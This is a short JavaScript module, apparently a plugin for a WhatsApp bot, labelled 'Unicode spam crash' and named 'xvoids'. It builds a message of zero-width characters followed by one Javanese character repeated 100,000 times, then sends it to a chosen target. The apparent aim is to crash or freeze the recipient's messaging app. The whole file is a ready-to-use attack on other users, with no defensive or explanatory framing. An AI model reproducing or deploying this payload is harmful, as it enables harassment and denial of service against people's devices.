// ============================================================
// BUG: xvoids — Unicode spam crash
// Source: Tayyab — adapted
// ============================================================

const PAYLOAD = '🌀 XVOIDS\n\n💣\u200C\u200B\u200D\n\n' + 'ꦾ'.repeat(100000);

export default {
  id: 'xvoids',
  name: 'Xvoids',

  async execute({ sock, target }) {
    await sock.sendMessage(target, { text: PAYLOAD });
  },
};